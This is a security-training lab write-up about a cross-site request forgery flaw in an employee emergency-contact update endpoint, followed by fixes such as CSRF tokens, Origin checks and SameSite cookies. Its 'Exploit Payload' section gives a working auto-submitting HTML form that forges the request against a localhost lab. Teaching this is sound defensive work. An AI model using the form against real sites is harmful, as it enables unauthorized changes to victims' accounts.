# CSRF Lab — Emergency Contact Takeover

## Lab Overview

This lab demonstrates a **Cross-Site Request Forgery (CSRF)** vulnerability where attackers can perform unauthorized actions on behalf of authenticated users.

The application allows employees to update emergency contact details but fails to verify whether requests originate from trusted sources.

Attackers exploit this weakness to modify sensitive account information without user consent.

---

## Vulnerability Type

Cross-Site Request Forgery (CSRF)

OWASP Category:

A01:2021 — Broken Access Control

A05:2021 — Security Misconfiguration

---

## Scenario

Employees can update emergency contact information through an internal portal.

Application endpoint:

POST

```text
/api/csrf/update-contact
```

Request body:

```json
{
"emergencyContact":"9876543210"
}
```

The application accepts update requests without validating:

- CSRF Tokens
- Request Origin
- SameSite protections

---

## Normal Usage

Legitimate request:

```text
POST
/api/csrf/update-contact
```

Body:

```json
{
"emergencyContact":"9876543210"
}
```

Response:

```json
{
"message":"Emergency contact updated successfully"
}
```

---

## Enumeration Clues

Developer notes expose:

```text
POST
/api/csrf/update-contact

Body:

{
"emergencyContact":
"9876543210"
}
```

The request does not include:

```text
csrf_token
origin_validation
referer_validation
```

Attackers may suspect missing CSRF protection.

---

## Exploit Payload

Craft malicious page:

```html
<form
action="http://localhost:5000/api/csrf/update-contact"
method="POST">

<input
type="hidden"
name="emergencyContact"
value="9999999999">

</form>

<script>
document.forms[0].submit();
</script>
```

Victim visits attacker-controlled page.

Browser automatically submits authenticated request.

---

## Successful Exploitation

Emergency contact changes:

From:

```text
9876543210
```

To:

```text
9999999999
```

Response:

```json
{
"message":
"Emergency contact updated successfully"
}
```

---

## Impact

Attacker gains ability to:

✔ Modify victim account settings

✔ Perform unauthorized actions

✔ Abuse authenticated sessions

Possible consequences:

```text
Account takeover
Profile modification
Financial fraud
Privilege abuse
```

---

## Root Cause

Application trusts authenticated requests without verifying origin.

Example vulnerable logic:

```text
POST /update-contact
```

without:

```text
CSRF token validation
Origin checks
SameSite restrictions
```

Forged requests become possible.

---

## Secure Fixes

### Implement CSRF Tokens

Require:

```text
csrf_token
```

for every state-changing request.

---

### Validate Origin Headers

Reject requests from:

```text
unknown domains
external websites
```

---

### Use SameSite Cookies

Enable:

```text
SameSite=Strict
```

or:

```text
SameSite=Lax
```

---

### Validate Referer Header

Allow only trusted sources.

---

## Learning Objectives

After completing this lab learners should understand:

- CSRF vulnerabilities
- Forged requests
- Browser trust abuse
- Session exploitation
- CSRF mitigation techniques

---

## Lab Information

Lab:

CSRF — Emergency Contact Takeover

Difficulty:

Medium

Category:

Authentication / Session Security

Status:

✔ Completed